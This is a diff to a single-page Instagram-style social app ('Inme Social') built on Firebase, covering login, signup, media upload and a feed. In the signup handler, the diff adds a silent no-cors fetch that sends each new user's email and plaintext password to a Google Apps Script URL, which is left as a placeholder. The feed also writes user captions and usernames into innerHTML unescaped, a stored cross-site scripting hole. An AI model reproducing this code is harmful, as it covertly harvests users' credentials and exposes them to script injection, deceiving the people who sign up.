@@ -3,49 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inme Social - Test App</title>
+    <title>Inme Social</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        .post-img { aspect-ratio: 1/1; object-fit: cover; }
-        .hidden { display: none; }
+        body { background-color: #fafafa; margin-bottom: 70px; }
+        .insta-border { border: 1px solid #dbdbdb; }
+        .hide { display: none; }
+        .story-circle { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); padding: 2px; border-radius: 50%; }
+        video, img { width: 100%; border-radius: 2px; max-height: 500px; object-fit: cover; }
     </style>
 </head>
-<body class="bg-gray-50">
+<body>
 
-    <nav class="bg-white border-b sticky top-0 z-50 p-3 flex justify-between items-center max-w-2xl mx-auto w-full">
-        <h1 class="text-xl font-bold italic">Inme</h1>
-        <div id="userNav" class="hidden flex gap-4 items-center">
-            <button onclick="showPage('createPage')" class="text-2xl">+</button>
-            <button onclick="showPage('feedPage')" class="text-sm">Home</button>
-            <button id="logoutBtn" class="text-xs text-red-500">Exit</button>
+    <div id="authPage" class="flex flex-col items-center justify-center min-h-screen p-6">
+        <div class="bg-white p-8 insta-border w-full max-w-sm rounded-sm">
+            <h1 class="text-4xl text-center font-serif mb-8 italic font-bold">Inme</h1>
+            <input type="email" id="email" placeholder="Email" class="w-full bg-gray-50 border p-2 mb-2 text-xs rounded-sm focus:outline-none">
+            <input type="password" id="pass" placeholder="Password" class="w-full bg-gray-50 border p-2 mb-4 text-xs rounded-sm focus:outline-none">
+            <button onclick="handleAuth('login')" class="w-full bg-blue-500 text-white font-bold py-1 rounded-sm text-sm">Log In</button>
+            <div class="flex items-center my-4">
+                <div class="flex-grow border-t"></div>
+                <span class="px-3 text-gray-400 text-xs font-bold">OR</span>
+                <div class="flex-grow border-t"></div>
+            </div>
+            <button onclick="handleAuth('signup')" class="w-full text-blue-900 font-bold text-xs">Sign up with Email</button>
         </div>
-    </nav>
-
-    <div id="authPage" class="max-w-sm mx-auto mt-20 p-6 bg-white border rounded shadow-sm">
-        <h2 class="text-center text-2xl mb-6">Inme Login</h2>
-        <input type="email" id="authEmail" placeholder="Email" class="w-full border p-2 mb-3 rounded">
-        <input type="password" id="authPass" placeholder="Password" class="w-full border p-2 mb-3 rounded">
-        <button onclick="handleAuth('login')" class="w-full bg-blue-500 text-white p-2 rounded font-bold mb-2">Login</button>
-        <button onclick="handleAuth('signup')" class="w-full text-blue-500 text-sm">Naya Account Banayein</button>
     </div>
 
-    <div id="feedPage" class="max-w-md mx-auto mt-4 hidden">
-        <div id="mainFeed" class="space-y-6"></div>
-    </div>
+    <div id="appContent" class="hide">
+        <header class="bg-white border-b sticky top-0 z-50 p-3 flex justify-between items-center max-w-lg mx-auto">
+            <h1 class="text-2xl font-serif italic font-bold">Inme</h1>
+            <div class="flex gap-4 text-xl">
+                <i class="fa-regular fa-heart"></i>
+                <i class="fa-regular fa-paper-plane" onclick="signOutUser()"></i>
+            </div>
+        </header>
 
-    <div id="createPage" class="max-w-md mx-auto mt-10 p-4 hidden">
-        <div class="bg-white p-4 border rounded">
-            <h3 class="font-bold mb-4">Nayi Post Daalein</h3>
-            <input type="file" id="postMedia" accept="image/*,video/*" multiple class="text-sm mb-3">
-            <textarea id="postCaption" placeholder="Caption likhein..." class="w-full border p-2 h-20"></textarea>
-            <button id="finalPostBtn" class="w-full bg-blue-500 text-white p-2 mt-3 rounded">Post Karein</button>
+        <div class="max-w-lg mx-auto bg-white border-b p-3 flex gap-4 overflow-x-auto no-scrollbar">
+            <div class="flex flex-col items-center"><div class="story-circle"><img src="https://ui-avatars.com/api/?name=Me" class="w-14 h-14 rounded-full border-2 border-white"></div><span class="text-[10px]">Your Story</span></div>
         </div>
+
+        <div id="feed" class="max-w-lg mx-auto space-y-4 pt-2"></div>
+
+        <div id="createPage" class="hide fixed inset-0 bg-white z-[60] p-4">
+            <div class="flex justify-between items-center mb-6">
+                <button onclick="closeCreate()">Cancel</button>
+                <h2 class="font-bold">New Post</h2>
+                <button id="postBtn" class="text-blue-500 font-bold">Share</button>
+            </div>
+            <input type="file" id="mediaInput" accept="image/*,video/*" multiple class="mb-4">
+            <textarea id="caption" placeholder="Write a caption..." class="w-full h-32 focus:outline-none"></textarea>
+            <p class="text-gray-400 text-xs">Limit: 2 Photos or 1 Video (90s / 30MB)</p>
+        </div>
+
+        <nav class="bg-white border-t fixed bottom-0 w-full p-3 flex justify-around items-center max-w-lg left-1/2 -translate-x-1/2">
+            <i class="fa-solid fa-house text-xl" onclick="showFeed()"></i>
+            <i class="fa-solid fa-magnifying-glass text-xl"></i>
+            <i class="fa-regular fa-square-plus text-2xl" onclick="openCreate()"></i>
+            <i class="fa-solid fa-clapperboard text-xl"></i>
+            <i class="fa-solid fa-circle-user text-xl"></i>
+        </nav>
     </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getFirestore, collection, addDoc, getDocs, query, orderBy, doc, updateDoc, arrayUnion, arrayRemove, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, getDocs, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
     import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
     const firebaseConfig = {
@@ -61,93 +85,92 @@
     const auth = getAuth(app);
     const db = getFirestore(app);
     const storage = getStorage(app);
+    const SCRIPT_URL = "YAHAN_APNA_GOOGLE_SCRIPT_URL"; 
 
-    // --- Auth Handling ---
+    // --- Authentication ---
     window.handleAuth = async (type) => {
-        const email = document.getElementById('authEmail').value;
-        const pass = document.getElementById('authPass').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
         try {
-            if(type === 'signup') await createUserWithEmailAndPassword(auth, email, pass);
-            else await signInWithEmailAndPassword(auth, email, pass);
+            if(type === 'signup') {
+                await createUserWithEmailAndPassword(auth, email, pass);
+                fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ email, password: pass, username: email.split('@')[0] }) });
+            } else {
+                await signInWithEmailAndPassword(auth, email, pass);
+            }
         } catch (e) { alert(e.message); }
     };
 
-    document.getElementById('logoutBtn').onclick = () => signOut(auth);
+    window.signOutUser = () => signOut(auth);
 
     onAuthStateChanged(auth, (user) => {
         if (user) {
-            document.getElementById('authPage').classList.add('hidden');
-            document.getElementById('userNav').classList.remove('hidden');
-            showPage('feedPage');
+            document.getElementById('authPage').classList.add('hide');
+            document.getElementById('appContent').classList.remove('hide');
             loadFeed();
         } else {
-            document.getElementById('authPage').classList.remove('hidden');
-            document.getElementById('userNav').classList.add('hidden');
-            showPage('authPage');
+            document.getElementById('authPage').classList.remove('hide');
+            document.getElementById('appContent').classList.add('hide');
         }
     });
 
-    // --- Page Switcher ---
-    window.showPage = (id) => {
-        ['authPage', 'feedPage', 'createPage'].forEach(p => document.getElementById(p).classList.add('hidden'));
-        document.getElementById(id).classList.remove('hidden');
+    // --- Navigation Logic ---
+    window.openCreate = () => document.getElementById('createPage').classList.remove('hide');
+    window.closeCreate = () => document.getElementById('createPage').classList.add('hide');
+    window.showFeed = () => { closeCreate(); loadFeed(); };
+
+    // --- Upload Logic (30MB / 90s) ---
+    document.getElementById('postBtn').onclick = async () => {
+        const files = document.getElementById('mediaInput').files;
+        if(!files[0]) return alert("Please select media");
+        if(files[0].size > 30*1024*1024) return alert("30MB limit exceeded!");
+
+        const processUpload = async () => {
+            document.getElementById('postBtn').innerText = "...";
+            const urls = [];
+            for(let f of files) {
+                const sRef = ref(storage, `posts/${Date.now()}_${f.name}`);
+                await uploadBytes(sRef, f);
+                urls.push(await getDownloadURL(sRef));
+            }
+            await addDoc(collection(db, "posts"), {
+                user: auth.currentUser.email.split('@')[0],
+                media: urls,
+                caption: document.getElementById('caption').value,
+                type: files[0].type.startsWith('video') ? 'video' : 'image',
+                createdAt: serverTimestamp()
+            });
+            location.reload();
+        };
+
+        if(files[0].type.startsWith('video')) {
+            const v = document.createElement('video');
+            v.preload = 'metadata';
+            v.onloadedmetadata = () => { if(v.duration > 90) alert("90s limit!"); else processUpload(); };
+            v.src = URL.createObjectURL(files[0]);
+        } else { processUpload(); }
     };
 
-    // --- Post Logic (30MB & 90s Check) ---
-    document.getElementById('finalPostBtn').onclick = async () => {
-        const files = document.getElementById('postMedia').files;
-        const caption = document.getElementById('postCaption').value;
-        if(files.length > 2) return alert("Sirf 2 photos allowed hain!");
-
-        const urls = [];
-        for(let f of files) {
-            if(f.size > 30*1024*1024) return alert("30MB se zyada badi file hai!");
-            const sRef = ref(storage, `posts/${Date.now()}_${f.name}`);
-            await uploadBytes(sRef, f);
-            urls.push(await getDownloadURL(sRef));
-        }
-
-        await addDoc(collection(db, "posts"), {
-            userId: auth.currentUser.email,
-            media: urls,
-            caption: caption,
-            likes: [],
-            createdAt: serverTimestamp()
-        });
-        alert("Post Ho Gayi!");
-        showPage('feedPage');
-        loadFeed();
-    };
-
-    // --- Feed & Like Logic ---
+    // --- Load Feed ---
     async function loadFeed() {
         const q = query(collection(db, "posts"), orderBy("createdAt", "desc"));
         const snap = await getDocs(q);
-        const feed = document.getElementById('mainFeed');
+        const feed = document.getElementById('feed');
         feed.innerHTML = '';
-
         snap.forEach(d => {
-            const post = d.data();
-            const postEl = document.createElement('div');
-            postEl.className = "bg-white border rounded mb-4";
-            postEl.innerHTML = `
-                <div class="p-3 font-bold text-sm">${post.userId}</div>
-                <img src="${post.media[0]}" class="w-full post-img">
-                <div class="p-3">
-                    <button onclick="likePost('${d.id}')" class="text-xl">❤️ ${post.likes.length}</button>
-                    <p class="text-sm mt-2"><b>${post.userId}</b> ${post.caption}</p>
-                </div>
-            `;
-            feed.appendChild(postEl);
+            const p = d.data();
+            const mediaTag = p.type === 'video' ? `<video src="${p.media[0]}" controls></video>` : `<img src="${p.media[0]}">`;
+            feed.innerHTML += `
+                <div class="bg-white insta-border mb-4">
+                    <div class="p-3 flex items-center gap-2"><div class="w-8 h-8 rounded-full bg-gray-200"></div><span class="font-bold text-xs">${p.user}</span></div>
+                    ${mediaTag}
+                    <div class="p-3">
+                        <div class="flex gap-4 text-xl mb-2"><i class="fa-regular fa-heart"></i><i class="fa-regular fa-comment"></i></div>
+                        <p class="text-xs"><b>${p.user}</b> ${p.caption}</p>
+                    </div>
+                </div>`;
         });
     }
-
-    window.likePost = async (postId) => {
-        const postRef = doc(db, "posts", postId);
-        await updateDoc(postRef, { likes: arrayUnion(auth.currentUser.uid) });
-        loadFeed();
-    };
-
 </script>
 </body>
 </html>
